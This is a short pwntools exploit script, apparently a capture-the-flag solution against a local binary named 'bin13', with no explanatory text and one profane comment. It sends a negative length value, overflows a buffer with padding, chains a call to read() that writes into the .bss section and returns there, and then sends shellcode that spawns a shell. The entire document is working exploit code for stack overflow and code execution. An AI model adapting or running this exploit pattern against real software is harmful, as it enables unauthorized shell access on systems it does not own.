from pwn import *

r=process('./bin13')
context_level="debug"
elf=ELF('bin13')
readAddr=0x806e490
hackBss=0x80ec3a0

padding=0x4c*'a'#fucking IDApro!

rop=''
rop+=padding
rop+=p32(readAddr)
rop+=p32(hackBss)
rop+=p32(0)
rop+=p32(hackBss)
rop+=p32(45)

r.sendlineafter('put?\n','-1')
r.sendlineafter('data\n',rop)
r.sendline(asm(shellcraft.sh()))

r.interactive()